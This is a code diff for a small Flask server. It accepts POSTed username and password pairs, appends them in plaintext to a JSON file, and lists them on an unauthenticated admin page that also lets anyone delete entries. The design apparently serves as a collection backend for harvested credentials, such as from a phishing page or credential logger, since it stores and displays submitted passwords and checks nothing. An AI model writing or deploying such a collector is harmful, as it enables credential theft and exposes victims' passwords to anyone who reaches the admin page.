@@ -1,92 +1,112 @@
 from flask import Flask, request, jsonify, render_template_string, redirect, url_for
-import json
-import os
+import json, os
 
 app = Flask(__name__)
+DB = 'used_users.json'
 
-DATA_FILE = "logs.json"
+HTML_TEMPLATE = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
+        h1 { color: #90caf9; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 10px; border: 1px solid #444; }
+        th { background-color: #1e1e1e; }
+        tr:nth-child(even) { background-color: #1a1a1a; }
+        form { display: inline; }
+        button { background-color: #e57373; border: none; padding: 5px 10px; color: #fff; cursor: pointer; border-radius: 4px; }
+        button:hover { background-color: #ef5350; }
+    </style>
+</head>
+<body>
+    <h1>🔐 Admin Panel</h1>
+    {% if records %}
+        <table>
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for r in records %}
+                <tr>
+                    <td>{{ loop.index }}</td>
+                    <td>{{ r.user }}</td>
+                    <td>{{ r.password }}</td>
+                    <td>
+                        <form method="POST" action="/delete/{{ loop.index0 }}">
+                            <button type="submit">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    {% else %}
+        <p>Không có log nào.</p>
+    {% endif %}
+</body>
+</html>
+'''
 
-def load_data():
-    if not os.path.exists(DATA_FILE):
-        return []
-    with open(DATA_FILE, "r", encoding="utf-8") as f:
-        return json.load(f)
-
-def save_data(data):
-    with open(DATA_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
+@app.route("/")
+def home():
+    return "✅ Server is running."
 
 @app.route("/submit", methods=["POST"])
 def submit():
-    try:
-        info = request.get_json()
-        user = info.get("user")
-        password = info.get("password")
+    data = request.json
+    if not isinstance(data, dict) or "user" not in data or "password" not in data:
+        return jsonify({"status": "error", "message": "invalid payload"}), 400
 
-        if not user or not password:
-            return "Missing fields", 400
+    records = []
+    if os.path.exists(DB):
+        with open(DB, 'r') as f:
+            try:
+                records = json.load(f)
+            except json.JSONDecodeError:
+                records = []
 
-        logs = load_data()
-        logs.append({"user": user, "password": password})
-        save_data(logs)
+    records.append(data)
+    with open(DB, 'w') as f:
+        json.dump(records, f, indent=2)
 
-        return "OK", 200
-    except Exception as e:
-        return str(e), 500
+    return jsonify({"status": "ok"})
 
-@app.route("/admin", methods=["GET", "POST"])
-def admin():
-    logs = load_data()
-    if request.method == "POST":
-        index = int(request.form.get("delete"))
-        if 0 <= index < len(logs):
-            del logs[index]
-            save_data(logs)
-            return redirect(url_for("admin"))
+@app.route("/admin", methods=["GET"])
+def admin_panel():
+    records = []
+    if os.path.exists(DB):
+        with open(DB, 'r') as f:
+            try:
+                records = json.load(f)
+            except json.JSONDecodeError:
+                records = []
+    return render_template_string(HTML_TEMPLATE, records=records)
 
-    html = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Admin Panel</title>
-        <style>
-            body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
-            table { border-collapse: collapse; width: 100%; }
-            th, td { border: 1px solid #444; padding: 8px; text-align: left; }
-            th { background: #222; }
-            tr:nth-child(even) { background: #1c1c1c; }
-            form { margin: 0; }
-            button { background: #e74c3c; color: white; border: none; padding: 5px 10px; cursor: pointer; }
-            button:hover { background: #c0392b; }
-        </style>
-    </head>
-    <body>
-        <h2>Admin Log Viewer</h2>
-        <table>
-            <tr><th>#</th><th>Username</th><th>Password</th><th>Action</th></tr>
-            {% for i, item in enumerate(logs) %}
-            <tr>
-                <td>{{ i }}</td>
-                <td>{{ item.user }}</td>
-                <td>{{ item.password }}</td>
-                <td>
-                    <form method="post">
-                        <input type="hidden" name="delete" value="{{ i }}">
-                        <button type="submit">Xoá</button>
-                    </form>
-                </td>
-            </tr>
-            {% endfor %}
-        </table>
-    </body>
-    </html>
-    """
-    return render_template_string(html, logs=logs)
+@app.route("/delete/<int:index>", methods=["POST"])
+def delete_entry(index):
+    if os.path.exists(DB):
+        with open(DB, 'r') as f:
+            try:
+                records = json.load(f)
+            except json.JSONDecodeError:
+                records = []
 
+        if 0 <= index < len(records):
+            records.pop(index)
+            with open(DB, 'w') as f:
+                json.dump(records, f, indent=2)
 
-# ✅ Dòng QUAN TRỌNG để Railway chạy được
+    return redirect(url_for('admin_panel'))
+
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8000))  # 👈 Railway tự set biến PORT cho đúng
-    print(f"🚀 Starting app on port {port}")
+    port = int(os.environ.get("PORT", 8000))
     app.run(host="0.0.0.0", port=port)
-# ✅ Railway sẽ tự động chạy file này khi deploy
